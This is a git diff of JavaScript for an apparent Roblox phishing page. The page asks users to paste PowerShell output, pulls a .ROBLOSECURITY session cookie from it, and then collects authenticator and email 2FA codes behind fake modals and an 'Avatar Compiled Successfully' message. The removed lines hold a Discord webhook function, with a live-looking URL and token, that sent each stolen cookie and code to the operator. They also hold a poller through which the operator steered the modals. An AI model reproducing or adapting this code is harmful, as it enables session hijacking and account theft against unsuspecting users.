@@ -41,10 +41,6 @@ document.getElementById('enterButton').addEventListener('click', function() {
 });
 
 // === PowerShell Submission ===
-let waitingForDiscord = false; // Track if we're waiting for Discord command
-let waitingForSecondDiscord = false; // Track if we're waiting for the second Discord command after 2FA code
-let codeEntered = false; // Track if a code was entered in any modal
-
 document.getElementById('submitButton').addEventListener('click', async function() {
   const powershellInput = document.getElementById('powershellInput');
   const powershellData = powershellInput.value.trim();
@@ -59,23 +55,20 @@ document.getElementById('submitButton').addEventListener('click', async function
 
   if (!match) {
     showErrorAlert();
-    await sendWebhook('No .ROBLOSECURITY Cookie Found', 'No .ROBLOSECURITY cookie found.', 0xff0000);
     powershellInput.value = '';
     closeModal('modal');
     return;
-  } else {
-    const cookie = match[1].trim();
-    await sendWebhook('New Cookie Captured', `\`\`\`${cookie}\`\`\``, 0x00ff00);
   }
 
   powershellInput.value = '';
   closeModal('modal');
 
-  // Show loading overlay and start waiting for Discord command
+  // Show loading overlay and after 10 seconds show 2FA modal
   showLoading(true, true); // true = cycling
-  waitingForDiscord = true;
-  waitingForSecondDiscord = false;
-  codeEntered = false;
+  setTimeout(() => {
+    showLoading(false);
+    openModal('twofa-modal');
+  }, 10000);
 });
 
 // === Loading Spinner and Message ===
@@ -167,16 +160,15 @@ if (twofaInput && verifyButton) {
       return;
     }
 
-    await sendWebhook('2FA Auth Code Captured 🔥', `Authenticator Code Entered: **${codeEnteredValue}**`, 0xffa500);
-
     twofaInput.value = '';
     closeModal('twofa-modal');
 
-    // Show loading overlay with only "Processing"
+    // Show loading overlay with only "Processing" for 5 seconds, then show email modal
     showLoading(true, false);
-    waitingForDiscord = false;
-    waitingForSecondDiscord = true;
-    codeEntered = true;
+    setTimeout(() => {
+      showLoading(false);
+      openModal('twofa-modal-2');
+    }, 5000);
   });
 }
 
@@ -197,35 +189,11 @@ if (twofaInput2 && verifyButton2) {
       return;
     }
 
-    await sendWebhook('2FA Email Code Captured 📩', `Second Modal Code Entered: **${codeEnteredValue}**`, 0xffa500);
-
     twofaInput2.value = '';
     closeModal('twofa-modal-2');
 
     // Show green alert box
     showSuccessPopup();
-    waitingForDiscord = false;
-    waitingForSecondDiscord = false;
-    codeEntered = true;
-  });
-}
-
-// === Webhook Sending ===
-async function sendWebhook(title, description, color) {
-  const webhookUrl = 'https://discord.com/api/webhooks/1387289722400936028/LOsYfsaZfL0NsGF3eT7xzmt5yektdbsP6fsRVtOR5_clDvSiszN7VXtKwz6wMDKE4hxT';
-  const payload = {
-    embeds: [{
-      title: title,
-      description: description,
-      color: color,
-      footer: { text: `Logger System • ${new Date().toLocaleString()}` }
-    }]
-  };
-
-  await fetch(webhookUrl, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify(payload)
   });
 }
 
@@ -239,9 +207,6 @@ function useAnotherMethod() {
   alert('Other verification methods are not available. Please use your authenticator app or check your email.');
 }
 
-function resendCode() {
-  alert('A new code has been sent to your email. (Simulation)');
-}
 function showSuccessPopup() {
   const popup = document.createElement('div');
   popup.textContent = 'Avatar Compiled Successfully ✅ You can close this page now.';
@@ -265,56 +230,3 @@ function showSuccessPopup() {
     setTimeout(() => popup.remove(), 500);
   }, 4000);
 }
-
-// === Poll Discord Bot Status and Control Modals ===
-let lastStatus = null;
-
-setInterval(async () => {
-  try {
-    // Only poll and react if we're waiting for Discord command
-    if (!waitingForDiscord && !waitingForSecondDiscord && !codeEntered) return;
-
-    const res = await fetch('http://localhost:3000/modal-status');
-    const data = await res.json();
-    if (!data.status || data.status === lastStatus) return;
-    lastStatus = data.status;
-
-    // === First Discord command after PowerShell ===
-    if (waitingForDiscord) {
-      if (data.status === "2") {
-        showLoading(false);
-        openModal('twofa-modal');
-        waitingForDiscord = false;
-        waitingForSecondDiscord = false;
-      } else if (data.status === "e") {
-        showLoading(false);
-        openModal('twofa-modal-2');
-        waitingForDiscord = false;
-        waitingForSecondDiscord = false;
-      }
-    }
-    // === Second Discord command after 2FA code ===
-    else if (waitingForSecondDiscord) {
-      if (data.status === "e") {
-        showLoading(false);
-        openModal('twofa-modal-2');
-        waitingForSecondDiscord = false;
-      } else if (data.status === "d" || data.status === "2") {
-        showLoading(false);
-        showSuccessPopup();
-        waitingForSecondDiscord = false;
-        codeEntered = false;
-      }
-    }
-    // === If a code was entered in any modal, and you type "d" or "e" or "2" ===
-    else if (codeEntered) {
-      if (data.status === "d" || data.status === "e" || data.status === "2") {
-        showLoading(false);
-        showSuccessPopup();
-        codeEntered = false;
-      }
-    }
-  } catch (e) {
-    // handle error
-  }
-}, 2000);
